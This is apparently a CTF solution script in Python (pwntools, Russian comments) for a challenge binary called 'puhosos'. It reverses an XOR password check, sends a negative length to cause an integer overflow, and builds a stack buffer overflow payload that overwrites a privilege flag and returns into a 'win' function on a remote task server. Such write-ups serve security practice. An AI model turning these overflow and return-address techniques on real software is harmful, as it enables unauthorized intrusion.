from pwn import *

def gen_password():
    expected = [
        0x56, 0x73, 0x5e, 0x20, 0x73, 0x61, 0x21, 0x60, 
        0x5b, 0x69, 0x74, 0x73, 0x5f, 0x2f, 0x5f, 0x5d, 
        0x11, 0x43, 0x55, 0x40, 0x5d, 0x49, 0x44, 0x41, 
        0x64, 0x4c, 0x73, 0x79, 0x5e, 0x5d, 0x1d, 0x57
    ]
    
    password = bytearray()
    for i in range(32):
        password.append(expected[i] ^ (i + 0x10))
        
    return password

# env = {'FLAG': 'CTF{}'}
# p = process('./puhosos', env=env)
p = remote("tasks.danissimurr.ru", 1337)

elf = ELF('./puhosos')
rop_elf = ROP(elf)

print("[*] Этап 1: Реверс пароля")
password = gen_password()
log.info(f"Сгенерированный пароль: {password.decode()}")

p.recvuntil(b"Enter puhosos-password: ")
p.sendline(password)

print("[*] Этап 2: Переполнение INT")
p.recvuntil(b"Enter length of puhosos-name (<=32): ")
p.sendline(b"-156")

print("[*] Этап 3: Перезапись структуры и BOF")
p.recvuntil(b"Enter puhosos-name: ")

payload = b"A" * 32         # Заполняем поле puhosos_name (32 байта)
payload += p32(1)           # Перезаписываем is_chief ненулевым значением
payload += b"B" * 12        # Добиваем 4 байта выравнивания + 8 байт (на место сохранённого RBP)

ret_address = rop_elf.find_gadget(['ret'])[0]
payload += p64(ret_address)
payload += p64(ret_address)

payload += p64(elf.symbols['win'])

p.sendline(payload)

p.interactive()